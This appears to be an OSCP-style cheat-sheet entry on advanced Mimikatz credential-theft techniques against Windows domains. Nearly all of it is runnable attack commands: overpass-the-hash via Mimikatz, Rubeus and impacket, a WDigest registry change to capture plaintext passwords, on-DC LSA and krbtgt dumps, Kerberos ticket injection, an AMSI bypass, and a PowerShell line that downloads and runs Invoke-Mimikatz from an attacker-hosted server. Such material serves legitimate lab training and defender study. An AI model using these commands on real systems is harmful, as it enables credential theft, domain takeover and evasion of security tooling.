title: Mimikatz — Advanced Techniques (OPTH, WDigest, On-DC)
body:
The base Mimikatz node covers the 80% case: dump LSASS, get hashes, use them. This covers the edge cases that come up in OSCP labs and modern environments where the obvious approach fails.

— WHEN TO REACH FOR EACH TECHNIQUE —

  Overpass-the-Hash      You have an NTLM hash but the target accepts only Kerberos
                         (NTLM disabled, or Kerberos-required service). Convert your
                         NTLM hash into a Kerberos TGT by replacing the RC4 key in
                         memory, then use the TGT normally.

  AES key extraction     Modern domains often disable RC4-HMAC. If you grab an NTLM
                         hash from one box, it may be useless against an AES-only
                         target. Pull the AES256 key instead — it's also in LSASS.

  WDigest plaintext      LSASS dump shows '(null)' for everyone's password — Windows
                         8.1+ default. Flip a registry key, wait for re-auth, and the
                         plaintext password lands in memory next time someone logs in.

  On-DC LSA dump         You have a SYSTEM shell on the DC but DCSync rights aren't
                         configured. Dump the AD database directly from LSASS instead
                         of going through replication.

  Invoke-Mimikatz        You can't drop a binary. Reflectively load Mimikatz from
                         a PowerShell one-liner, run any command, get output back.

  ccache injection       You have a Kerberos ticket from a Linux exploit (e.g. PyKEK,
                         impacket) and need to use it from a Windows host.
cmd:
# ══════════════════════════════════════════════════
# OVERPASS-THE-HASH (NTLM hash → Kerberos TGT)
# ══════════════════════════════════════════════════
# When PTH fails because the target only accepts Kerberos.
# Mimikatz replaces the RC4 key in your current Kerberos session,
# the next TGT request is signed with the user's hash, and you get a
# legitimate-looking TGT.

mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:NTHASH /run:powershell.exe

# In the spawned PowerShell:
klist                                          # see the new TGT after first Kerberos request
dir \\dc01.corp.com\c$                          # forces a TGT request, populates klist

# AES variant (preferred when RC4 is disabled):
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /aes256:AESKEY /run:powershell.exe

# Get the AES key from LSASS (where it's stored alongside NTLM):
mimikatz # sekurlsa::ekeys
# Look for aes256_hmac and aes128_hmac entries per user

# Rubeus equivalent (no Mimikatz on disk):
.\Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /domain:corp.com /ptt
.\Rubeus.exe asktgt /user:Administrator /aes256:AESKEY /domain:corp.com /ptt

# Kali equivalent — getTGT from impacket:
impacket-getTGT -hashes :NTHASH corp.com/Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.com/Administrator@dc01.corp.com

# ══════════════════════════════════════════════════
# WDIGEST PLAINTEXT TRICK
# ══════════════════════════════════════════════════
# Modern Windows (8.1+ / 2012 R2+) doesn't store cleartext in LSASS.
# sekurlsa::logonpasswords shows 'Password : (null)' for everyone.
#
# If you have local Admin, you can re-enable it. Plaintext lands in LSASS
# on the NEXT logon (existing sessions don't get rewritten retroactively).

# Check current state:
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# Enable plaintext caching:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# PowerShell version:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value 1

# Now WAIT for someone to log in. Options to accelerate:
#  - RDP yourself off and back on as the target user (if you have their hash via PTH)
#  - Lock and unlock the screen if the target account has an existing session
#  - Wait for a scheduled task / service to re-auth
#  - Trigger a coerced auth (PrinterBug, PetitPotam — see ntlm_relay node)

# Then dump again:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Now Password: field shows actual cleartext

# ══════════════════════════════════════════════════
# ON-DC LSA DUMP — when DCSync isn't an option
# ══════════════════════════════════════════════════
# You have a SYSTEM shell on the DC but the user you're running as
# doesn't have replication rights for DCSync. Dump LSA directly.

mimikatz # privilege::debug
mimikatz # token::elevate                       # get SYSTEM if you're only Admin
mimikatz # lsadump::lsa /inject /name:krbtgt    # specific user
mimikatz # lsadump::lsa /inject /patch          # all users, NTLM hashes only (faster)
mimikatz # lsadump::lsa /inject                 # all users, full credential data

# ══════════════════════════════════════════════════
# INVOKE-MIMIKATZ — REFLECTIVE LOAD, NO DISK WRITES
# ══════════════════════════════════════════════════
# Useful when AV nukes mimikatz.exe but PowerShell logging isn't tight.
# Note: 'mimikatz', 'Delpy', 'gentilkiwi' strings get flagged. A renamed
# fork (e.g. PowerSploit's Invoke-Mimikatz, hosted on your attacker box) works.

# From attacker — host Invoke-Mimikatz.ps1 on a webserver:
python3 -m http.server 80

# From target — single PowerShell line:
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

# Run a custom command instead of dumping:
IEX (...); Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" exit'

# Dump from a remote box you have admin on (PowerShell Remoting required):
IEX (...); Invoke-Mimikatz -ComputerName client01 -DumpCreds

# AMSI bypass first if PowerShell is logging strings:
# (Many bypasses exist; this is just one common pattern — research current bypasses)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ══════════════════════════════════════════════════
# CCACHE INJECTION (Linux ticket → Windows session)
# ══════════════════════════════════════════════════
# You ran impacket-getTGT or PyKEK on Kali, you have a .ccache file,
# now you want to use it from a Windows shell.

# Convert ccache to .kirbi format on Kali:
impacket-ticketConverter Administrator.ccache Administrator.kirbi

# Transfer to Windows target, then:
mimikatz # kerberos::ptt c:\temp\Administrator.kirbi
klist                                          # confirms ticket loaded
dir \\dc01.corp.com\c$                          # use it

# Or PTC for ccache directly (some Mimikatz versions):
mimikatz # kerberos::ptc c:\temp\Administrator.ccache

# Purge before passing a different ticket:
mimikatz # kerberos::purge

# ══════════════════════════════════════════════════
# MIMIKATZ RIGHTS TIERS (which command needs what)
# ══════════════════════════════════════════════════
#
# NO ELEVATION NEEDED:
#   kerberos::list           — your own tickets
#   kerberos::ptt            — inject a ticket into your own session
#   kerberos::purge          — clear your own tickets
#
# ADMIN + privilege::debug:
#   sekurlsa::logonpasswords — the bread and butter
#   sekurlsa::tickets        — all users' tickets in LSASS
#   sekurlsa::pth            — pass-the-hash / overpass-the-hash
#   sekurlsa::ekeys          — AES keys from LSASS
#   lsadump::sam             — local SAM database
#   lsadump::secrets         — LSA secrets (cached domain logons)
#   token::elevate           — escalate Admin → SYSTEM
#
# SYSTEM (use token::elevate first, or run from a SYSTEM shell):
#   lsadump::lsa /inject     — on-DC AD dump
#   misc::skeleton           — DC persistence (out of OSCP scope)
#
# DOMAIN ADMIN-EQUIVALENT (replication rights):
#   lsadump::dcsync          — pull any user's hash from any DC remotely
warn: WDigest registry change is loud — defenders monitor this exact key as a credential-theft IOC. Fine for OSCP labs; never do this on a real engagement without written authorization. Same for Invoke-Mimikatz reflective load — works on lab AV, gets caught by anything modern. The base mimikatz node's comsvcs.dll dump-and-parse-offline approach is more reliable in real environments.

choices.label: Got NTLM but Kerberos-only target — Overpass-the-Hash flow
Got krbtgt hash — golden ticket via lateral movement
Need ticket from impacket on Kali — ccache workflow
SSP injection — persistent cleartext credential harvesting
